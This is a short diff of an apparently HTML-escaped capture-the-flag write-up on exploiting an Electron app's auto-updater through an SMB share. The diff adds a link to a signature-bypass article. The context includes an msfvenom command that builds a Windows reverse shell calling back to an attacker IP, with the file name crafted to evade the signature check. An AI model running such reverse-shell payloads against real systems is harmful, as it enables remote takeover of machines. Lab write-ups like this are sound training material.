@@ -72,6 +72,9 @@ We only have a pdf file!
 &lt;img src=&#34;electron1.png&#34;&gt;
 &lt;p&gt;The Heedv1 app is build with &lt;code&gt;electron-builder&lt;/code&gt; and also we can drop updates in the client folders in the smb and it get executed.
 Searching in  google for an electron builder update rce, we can find an interesting&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&#34;&gt;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;p&gt;Let&amp;rsquo;s first create our shell with the name &amp;ldquo;s&amp;rsquo;hell.exe&amp;rdquo; to bypass the signature&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp  lhost=10.10.14.5 lport=9001 -f exe -o &amp;quot;s&#39;hell.exe&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;
